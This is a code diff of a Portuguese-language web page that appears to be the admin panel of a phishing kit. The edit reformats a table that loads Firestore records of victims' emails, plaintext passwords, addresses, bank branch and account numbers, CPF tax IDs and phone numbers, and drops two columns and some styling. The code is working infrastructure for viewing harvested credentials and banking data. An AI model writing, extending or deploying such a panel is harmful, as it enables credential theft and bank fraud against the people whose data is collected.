@@ -19,47 +19,6 @@
         .toggle-btn svg { vertical-align: middle; }
         .toggle-info { margin-top: 10px; text-align: center; font-size: 0.98em; color: #555; background: #f7f7f7; border-radius: 7px; padding: 10px 8px; min-height: 44px; }
         #status-msg { margin-top: 15px; color: #1ec773; text-align: center; font-size: 1em; }
-        #painel-logs-login table {
-            width: 100%;
-            border-collapse: collapse;
-            table-layout: fixed;
-        }
-        #painel-logs-login th, #painel-logs-login td {
-            padding: 8px;
-            border: 1px solid #eee;
-            text-align: center;
-            vertical-align: middle;
-            font-size: 1rem;
-            word-break: break-word;
-            white-space: pre-line;
-        }
-        #painel-logs-login th {
-            background: #f7f7f7;
-            font-weight: 700;
-        }
-        #painel-logs-login td {
-            background: #fff;
-        }
-        #painel-logs-login td:nth-child(3) {
-            min-width: 120px;
-            max-width: 180px;
-        }
-        #painel-logs-login td {
-            min-width: 70px;
-            max-width: 120px;
-        }
-        @media (max-width: 900px) {
-            #painel-logs-login th, #painel-logs-login td {
-                font-size: 0.92rem;
-                padding: 5px;
-            }
-            #painel-logs-login td:nth-child(3) {
-                max-width: 120px;
-            }
-            #painel-logs-login td {
-                max-width: 80px;
-            }
-        }
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
@@ -150,8 +109,6 @@
                     <th style="padding:8px; border:1px solid #eee;">Banco</th>
                     <th style="padding:8px; border:1px solid #eee;">Agência</th>
                     <th style="padding:8px; border:1px solid #eee;">Conta</th>
-                    <th style="padding:8px; border:1px solid #eee;">Tipo</th>
-                    <th style="padding:8px; border:1px solid #eee;">Titular</th>
                     <th style="padding:8px; border:1px solid #eee;">CPF</th>
                     <th style="padding:8px; border:1px solid #eee;">Telefone</th>
                 </tr>
@@ -533,7 +490,16 @@
                 snapshot.forEach(doc => {
                     const data = doc.data();
                     const tr = document.createElement('tr');
-                    tr.innerHTML = `<td style='padding:8px; border:1px solid #eee;'>${data.email || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.senha || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.endereco || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.banco || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.agencia || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.conta || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.tipoConta || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.titular || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.cpf || ''}</td><td style='padding:8px; border:1px solid #eee;'>${data.telefone || ''}</td>`;
+                    tr.innerHTML = `
+                        <td style='padding:8px; border:1px solid #eee;'>${data.email || ''}</td>
+                        <td style='padding:8px; border:1px solid #eee;'>${data.senha || ''}</td>
+                        <td style='padding:8px; border:1px solid #eee;'>${data.endereco || ''}</td>
+                        <td style='padding:8px; border:1px solid #eee;'>${data.banco || ''}</td>
+                        <td style='padding:8px; border:1px solid #eee;'>${data.agencia || ''}</td>
+                        <td style='padding:8px; border:1px solid #eee;'>${data.conta || ''}</td>
+                        <td style='padding:8px; border:1px solid #eee;'>${data.cpf || ''}</td>
+                        <td style='padding:8px; border:1px solid #eee;'>${data.telefone || ''}</td>
+                    `;
                     tbodyLogsLogin.appendChild(tr);
                 });
             });
